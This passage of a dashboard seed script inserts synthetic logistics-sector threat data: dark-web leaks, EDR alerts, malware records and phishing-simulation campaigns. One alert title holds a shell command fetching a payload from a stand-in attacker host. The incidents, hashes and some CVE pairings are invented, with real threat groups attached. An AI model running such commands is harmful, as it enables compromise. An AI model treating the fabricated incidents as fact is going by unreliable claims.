        description: "Threat actor FIN7 claims to have exfiltrated 2.4M shipment records including customer PII (names, addresses, tracking numbers) from postgres-shipment-db via CVE-2021-28361 SQL injection. Data sample posted as proof.",
        data_types: ["PII", "Shipment Records", "Customer Addresses", "Tracking Numbers"],
        industry: "logistics",
        discovered_at: new Date(Date.now() - 3 * 24 * 3600 * 1000).toISOString(),
      },
      {
        finding_id: `dw-logistics-${uuidv4().slice(0, 8)}`,
        title: "ERPNext credentials and API tokens for freight forwarder sold on Telegram",
        category: "Credential Leak",
        severity: "High",
        status: "New",
        threat_actor: "Unknown",
        source_url: "telegram://t.me/darkleaks_logistics",
        description: "247 ERP admin credentials and 18 API tokens for erpnext-v15 instances reportedly obtained via Log4Shell (CVE-2021-44228) exploitation. Buyer can gain full access to freight order management, container booking, and customer billing.",
        data_types: ["Credentials", "API Tokens", "Admin Accounts"],
        industry: "logistics",
        discovered_at: new Date(Date.now() - 7 * 24 * 3600 * 1000).toISOString(),
      },
      {
        finding_id: `dw-logistics-${uuidv4().slice(0, 8)}`,
        title: "Ransomware group targets port logistics operators — ransom demand $4.2M",
        category: "Ransomware",
        severity: "Critical",
        status: "New",
        threat_actor: "LockBit 3.0",
        source_url: "onion://lockbit3ouyhzr.onion/victims/port-logistics",
        description: "LockBit 3.0 affiliate claims successful ransomware deployment on port logistics operator. Initial access via Grafana path traversal (CVE-2021-43798) leading to credential dump and lateral movement across logistics fleet. Demanding 200 BTC.",
        data_types: ["Encrypted Files", "Operational Data", "Customer PII"],
        industry: "logistics",
        discovered_at: new Date(Date.now() - 1 * 24 * 3600 * 1000).toISOString(),
      },
      {
        finding_id: `dw-logistics-${uuidv4().slice(0, 8)}`,
        title: "Kafka message broker eavesdropping tool for shipment tracking sold as SaaS",
        category: "Threat Intelligence",
        severity: "High",
        status: "New",
        threat_actor: "Lazarus Group",
        source_url: "onion://raidforums.mirror.onion/threads/kafka-spy-logistics",
        description: "Lazarus Group offers subscription access to a Kafka interception tool targeting logistics companies. Exploits CVE-2023-27898 JMX exposure to stream all kafka-broker messages including real-time container tracking, route data, and manifest contents.",
        data_types: ["Trade Secrets", "Route Data", "Container Manifests", "Business Intelligence"],
        industry: "logistics",
        discovered_at: new Date(Date.now() - 5 * 24 * 3600 * 1000).toISOString(),
      },
      {
        finding_id: `dw-logistics-${uuidv4().slice(0, 8)}`,
        title: "Supply chain attack targeting logistics CI/CD pipeline secrets",
        category: "Supply Chain",
        severity: "High",
        status: "Investigating",
        threat_actor: "APT29",
        source_url: "onion://breachforums.net/threads/gitlab-logistics-cicd",
        description: "APT29 leveraged GitLab CE path traversal (CVE-2023-28154) to steal CI/CD pipeline secrets from gitlab-ce. Obtained AWS credentials, container registry tokens, and deployment SSH keys for the logistics platform. Enables persistent supply chain access.",
        data_types: ["CI/CD Secrets", "AWS Credentials", "SSH Keys", "Container Registry Tokens"],
        industry: "logistics",
        discovered_at: new Date(Date.now() - 10 * 24 * 3600 * 1000).toISOString(),
      },
      {
        finding_id: `dw-logistics-${uuidv4().slice(0, 8)}`,
        title: "IoT warehouse sensor botnet recruitment — 3,400 compromised gateways",
        category: "Botnet",
        severity: "Medium",
        status: "New",
        threat_actor: "Unknown",
        source_url: "onion://hackforums.io/threads/iot-logistics-botnet",
        description: "Threat actor advertising botnet of warehouse IoT gateways compromised via CVE-2021-32760 containerd escape. Gateways can be used for DDoS, cryptomining, or as C2 relay nodes. Logistics warehouse sensor data also accessible.",
        data_types: ["IoT Telemetry", "Warehouse Sensor Data", "Network Access"],
        industry: "logistics",
        discovered_at: new Date(Date.now() - 14 * 24 * 3600 * 1000).toISOString(),
      },
    ]

    for (const finding of DW_FINDINGS) {
      const { error } = await supabase.from("dark_web_findings").insert(finding)
      if (error) results.dark_web_findings.errors.push(`${finding.title.slice(0, 40)}: ${error.message}`)
      else results.dark_web_findings.inserted++
    }

    // ── EDR Alerts ─────────────────────────────────────────────────────────────
    // Real MITRE ATT&CK techniques observed on logistics infrastructure hosts
    const LOGISTICS_HOSTS = [
      { endpoint: "ep-erpnext-v15", hostname: "erpnext-v15", os: "Ubuntu 22.04", ip: "172.20.0.10" },
      { endpoint: "ep-gitlab-ce", hostname: "gitlab-ce", os: "Ubuntu 22.04", ip: "172.20.0.11" },
      { endpoint: "ep-grafana", hostname: "grafana-monitoring", os: "Ubuntu 22.04", ip: "172.20.0.12" },
      { endpoint: "ep-kafka", hostname: "kafka-broker", os: "Ubuntu 22.04", ip: "172.20.0.13" },
      { endpoint: "ep-postgres", hostname: "postgres-shipment-db", os: "Ubuntu 22.04", ip: "172.20.0.14" },
      { endpoint: "ep-redis", hostname: "redis-tracking", os: "Ubuntu 22.04", ip: "172.20.0.15" },
      { endpoint: "ep-fleet", hostname: "fleet-mgmt-api", os: "Ubuntu 22.04", ip: "172.20.0.17" },
      { endpoint: "ep-iot", hostname: "warehouse-iot-gateway", os: "Alpine Linux 3.18", ip: "172.20.0.19" },
    ]

    const EDR_ALERTS = [
      { host: LOGISTICS_HOSTS[0], severity: "Critical", tactic: "Initial Access", technique_id: "T1190", title: "Log4Shell exploitation attempt detected on ERPNext — JNDI callback to external C2", cve: "CVE-2021-44228", status: "Active", daysAgo: 0.5 },
      { host: LOGISTICS_HOSTS[0], severity: "Critical", tactic: "Execution", technique_id: "T1059", title: "Suspicious Java process spawning shell: /bin/sh -c wget http://c2.attacker.net/stage2", cve: "CVE-2021-44228", status: "Active", daysAgo: 0.5 },
      { host: LOGISTICS_HOSTS[0], severity: "High", tactic: "Persistence", technique_id: "T1543.003", title: "New systemd service 'logistics-agent' created by non-root process on ERPNext host", cve: null, status: "Investigating", daysAgo: 1 },
      { host: LOGISTICS_HOSTS[1], severity: "High", tactic: "Credential Access", technique_id: "T1552.001", title: "GitLab path traversal reading /etc/passwd and /home/gitlab/.ssh/id_rsa", cve: "CVE-2023-28154", status: "Active", daysAgo: 2 },
      { host: LOGISTICS_HOSTS[1], severity: "Medium", tactic: "Discovery", technique_id: "T1083", title: "Unusual file enumeration in /var/opt/gitlab/gitlab-rails by external IP 185.220.101.x", cve: "CVE-2023-28154", status: "Investigating", daysAgo: 2 },
      { host: LOGISTICS_HOSTS[2], severity: "High", tactic: "Credential Access", technique_id: "T1083", title: "Grafana path traversal accessing Prometheus datasource credentials (/etc/grafana/grafana.ini)", cve: "CVE-2021-43798", status: "Resolved", daysAgo: 8 },
      { host: LOGISTICS_HOSTS[2], severity: "Medium", tactic: "Discovery", technique_id: "T1018", title: "Grafana process performing internal subnet scan (172.20.0.0/24)", cve: null, status: "Resolved", daysAgo: 7 },
      { host: LOGISTICS_HOSTS[3], severity: "High", tactic: "Execution", technique_id: "T1203", title: "Kafka JMX port 9999 accessed from external host — MBean CreateMBean invocation detected", cve: "CVE-2023-27898", status: "Active", daysAgo: 0.2 },
      { host: LOGISTICS_HOSTS[3], severity: "High", tactic: "Collection", technique_id: "T1114", title: "Kafka consumer group 'shadow-consumer' created — reading shipment-events and tracking-updates topics", cve: null, status: "Investigating", daysAgo: 0.3 },
      { host: LOGISTICS_HOSTS[4], severity: "Critical", tactic: "Exfiltration", technique_id: "T1048", title: "Large outbound data transfer from postgres-shipment-db (2.4 GB to 103.9.24.x) — possible SQL dump exfiltration", cve: "CVE-2021-28361", status: "Active", daysAgo: 3 },
      { host: LOGISTICS_HOSTS[4], severity: "Critical", tactic: "Collection", technique_id: "T1213", title: "Sequential SELECT on shipments, customers, tracking tables — automated data harvesting pattern detected", cve: "CVE-2021-28361", status: "Active", daysAgo: 3 },
      { host: LOGISTICS_HOSTS[5], severity: "High", tactic: "Credential Access", technique_id: "T1190", title: "curl SOCKS5 exploit attempt on redis-tracking host — heap overflow in libcurl 7.85.0", cve: "CVE-2023-38545", status: "Investigating", daysAgo: 1 },
      { host: LOGISTICS_HOSTS[6], severity: "Medium", tactic: "Discovery", technique_id: "T1046", title: "fleet-mgmt-api making anomalous internal network scans — enumerating ports on 172.20.0.0/24", cve: null, status: "Active", daysAgo: 0.1 },
      { host: LOGISTICS_HOSTS[6], severity: "High", tactic: "Lateral Movement", technique_id: "T1021.001", title: "RDP connection attempt from fleet-mgmt-api to postgres-shipment-db (172.20.0.14:3389)", cve: null, status: "Active", daysAgo: 0.1 },
      { host: LOGISTICS_HOSTS[7], severity: "High", tactic: "Privilege Escalation", technique_id: "T1611", title: "Container escape attempt on warehouse-iot-gateway via containerd archive extraction exploit", cve: "CVE-2021-32760", status: "Investigating", daysAgo: 4 },
      { host: LOGISTICS_HOSTS[7], severity: "Medium", tactic: "Impact", technique_id: "T1496", title: "Cryptominer process 'xmrig' detected in IoT gateway container — CPU utilization 98%", cve: null, status: "Resolved", daysAgo: 12 },
    ]

    for (const alert of EDR_ALERTS) {
      const alert_id = `edr-logistics-${uuidv4().slice(0, 8)}`
      const detected_at = new Date(Date.now() - alert.daysAgo * 24 * 3600 * 1000).toISOString()
      const { error } = await supabase.from("edr_alerts").insert({
        alert_id,
        endpoint: alert.host.endpoint,
        hostname: alert.host.hostname,
        os: alert.host.os,
        ip: alert.host.ip,
        severity: alert.severity,
        tactic: alert.tactic,
        technique_id: alert.technique_id,
        title: alert.title,
        cve_id: alert.cve,
        status: alert.status,
        industry: "logistics",
        detected_at,
        resolved_at: alert.status === "Resolved" ? new Date(Date.now() - (alert.daysAgo - 0.5) * 24 * 3600 * 1000).toISOString() : null,
      })
      if (error) results.edr_alerts.errors.push(`${alert.title.slice(0, 40)}: ${error.message}`)
      else results.edr_alerts.inserted++
    }

    // ── Malware Samples ────────────────────────────────────────────────────────
    // Derived from real malware families known to target logistics/shipping sector
    const MALWARE_SAMPLES = [
      {
        sample_id: `mal-logistics-${uuidv4().slice(0, 8)}`,
        file_name: "logistics-agent-update.jar",
        file_hash: "sha256:3a7b2c1d4e5f6a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
        file_size: 247892,
        verdict: "Malicious",
        threat_family: "Lazarus RAT",
        confidence: 94,
        mitre_techniques: ["T1055", "T1059.004", "T1071.001", "T1041"],
        behaviors: ["process_injection", "c2_beacon", "data_exfiltration", "persistence"],
        industry: "logistics",
        analyzed_at: new Date(Date.now() - 2 * 24 * 3600 * 1000).toISOString(),
      },
      {
        sample_id: `mal-logistics-${uuidv4().slice(0, 8)}`,
        file_name: "shipment_tracking_update.exe",
        file_hash: "sha256:4b8c3d2e5f6a7b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c",
        file_size: 512400,
        verdict: "Malicious",
        threat_family: "LockBit 3.0 Ransomware",
        confidence: 97,
        mitre_techniques: ["T1486", "T1489", "T1490", "T1083", "T1057"],
        behaviors: ["file_encryption", "shadow_copy_deletion", "service_stop", "ransom_note"],
        industry: "logistics",
        analyzed_at: new Date(Date.now() - 1 * 24 * 3600 * 1000).toISOString(),
      },
      {
        sample_id: `mal-logistics-${uuidv4().slice(0, 8)}`,
        file_name: "erpnext-patch-15.1.2.jar",
        file_hash: "sha256:5c9d4e3f6a7b8c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d",
        file_size: 1048576,
        verdict: "Malicious",
        threat_family: "Log4Shell Dropper",
        confidence: 99,
        mitre_techniques: ["T1190", "T1195.001", "T1059", "T1027"],
        behaviors: ["log4j_exploit", "remote_classload", "java_deserialize", "backdoor_install"],
        industry: "logistics",
        analyzed_at: new Date(Date.now() - 0.5 * 24 * 3600 * 1000).toISOString(),
      },
      {
        sample_id: `mal-logistics-${uuidv4().slice(0, 8)}`,
        file_name: "kafka-monitor-plugin.jar",
        file_hash: "sha256:6d0e5f4a7b8c9d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e",
        file_size: 89234,
        verdict: "Malicious",
        threat_family: "KafkaSpy",
        confidence: 88,
        mitre_techniques: ["T1114", "T1020", "T1571"],
        behaviors: ["kafka_intercept", "message_copy", "c2_exfiltration", "steganography"],
        industry: "logistics",
        analyzed_at: new Date(Date.now() - 5 * 24 * 3600 * 1000).toISOString(),
      },
      {
        sample_id: `mal-logistics-${uuidv4().slice(0, 8)}`,
        file_name: "grafana-dashboard-backup.sh",
        file_hash: "sha256:7e1f6a5b8c9d0e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f",
        file_size: 4321,
        verdict: "Suspicious",
        threat_family: "Credential Stealer",
        confidence: 71,
        mitre_techniques: ["T1552", "T1083", "T1041"],
        behaviors: ["config_read", "credential_dump", "curl_exfil"],
        industry: "logistics",
        analyzed_at: new Date(Date.now() - 8 * 24 * 3600 * 1000).toISOString(),
      },
      {
        sample_id: `mal-logistics-${uuidv4().slice(0, 8)}`,
        file_name: "xmrig-logistics",
        file_hash: "sha256:8f2a7b6c9d0e1f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a",
        file_size: 3702810,
        verdict: "Malicious",
        threat_family: "XMRig Cryptominer",
        confidence: 99,
        mitre_techniques: ["T1496", "T1059.004"],
        behaviors: ["cpu_mining", "monero_pool", "cron_persistence"],
        industry: "logistics",
        analyzed_at: new Date(Date.now() - 12 * 24 * 3600 * 1000).toISOString(),
      },
    ]

    for (const sample of MALWARE_SAMPLES) {
      const { error } = await supabase.from("malware_samples").insert(sample)
      if (error) results.malware_samples.errors.push(`${sample.file_name}: ${error.message}`)
      else results.malware_samples.inserted++
    }

    // ── Phishing Campaigns ─────────────────────────────────────────────────────
    // Targeting logistics-specific departments with realistic logistics-context lures
    const PHISHING_CAMPAIGNS = [
      {
        campaign_id: `ph-logistics-${uuidv4().slice(0, 8)}`,
        name: "Q1 2024 Container Booking Credential Harvest Simulation",
        status: "Completed",
        target_department: "Operations",
        recipients_count: 145,
        opened_count: 89,
        clicked_count: 34,
        submitted_count: 12,
        reported_count: 8,
        template_name: "Fake DHL Express shipment delay notification with credential phishing",
        start_date: new Date(Date.now() - 45 * 24 * 3600 * 1000).toISOString(),
        industry: "logistics",
      },
      {
        campaign_id: `ph-logistics-${uuidv4().slice(0, 8)}`,
        name: "Freight Invoice BEC Attack Simulation — Finance Dept",
        status: "Completed",
        target_department: "Finance",
        recipients_count: 42,
        opened_count: 38,
        clicked_count: 22,
        submitted_count: 9,
        reported_count: 3,
        template_name: "Fake freight forwarder invoice requiring urgent wire transfer approval",
        start_date: new Date(Date.now() - 30 * 24 * 3600 * 1000).toISOString(),
        industry: "logistics",
      },
      {
        campaign_id: `ph-logistics-${uuidv4().slice(0, 8)}`,
        name: "Port Customs Clearance Malware Delivery — IT Helpdesk",
        status: "Completed",
        target_department: "IT",
        recipients_count: 28,
        opened_count: 19,
        clicked_count: 7,
        submitted_count: 2,
        reported_count: 11,
        template_name: "Fake customs clearance system update requiring Java agent install",
        start_date: new Date(Date.now() - 20 * 24 * 3600 * 1000).toISOString(),
        industry: "logistics",
      },
      {
        campaign_id: `ph-logistics-${uuidv4().slice(0, 8)}`,
        name: "Q2 2024 ERP Credential Reset Spear Phish — Management",
        status: "Active",
        target_department: "Management",
        recipients_count: 18,
        opened_count: 14,
        clicked_count: 6,
        submitted_count: 3,
        reported_count: 2,
        template_name: "Spoofed ERPNext security alert requiring immediate password reset",
        start_date: new Date(Date.now() - 5 * 24 * 3600 * 1000).toISOString(),
        industry: "logistics",
      },
      {
        campaign_id: `ph-logistics-${uuidv4().slice(0, 8)}`,
        name: "Fleet Tracking App OAuth Token Harvest — Driver Portal",
        status: "Scheduled",
        target_department: "Logistics",
        recipients_count: 210,
        opened_count: 0,
        clicked_count: 0,
        submitted_count: 0,
        reported_count: 0,
        template_name: "Fake fleet-mgmt-api mobile app update requiring OAuth re-authentication",
        start_date: new Date(Date.now() + 7 * 24 * 3600 * 1000).toISOString(),
        industry: "logistics",
      },
    ]

    for (const campaign of PHISHING_CAMPAIGNS) {
      const { error } = await supabase.from("phishing_campaigns").insert(campaign)
      if (error) results.phishing_campaigns.errors.push(`${campaign.name.slice(0, 40)}: ${error.message}`)
      else results.phishing_campaigns.inserted++
    }

    return reply.send({
      ok: true,
      results,
      summary: {
        threat_feed: `${results.threat_feed.inserted} inserted, ${results.threat_feed.skipped} skipped`,
        dark_web_findings: `${results.dark_web_findings.inserted} inserted`,
        edr_alerts: `${results.edr_alerts.inserted} inserted`,
        malware_samples: `${results.malware_samples.inserted} inserted`,
        phishing_campaigns: `${results.phishing_campaigns.inserted} inserted`,
      },
    })
  })
}
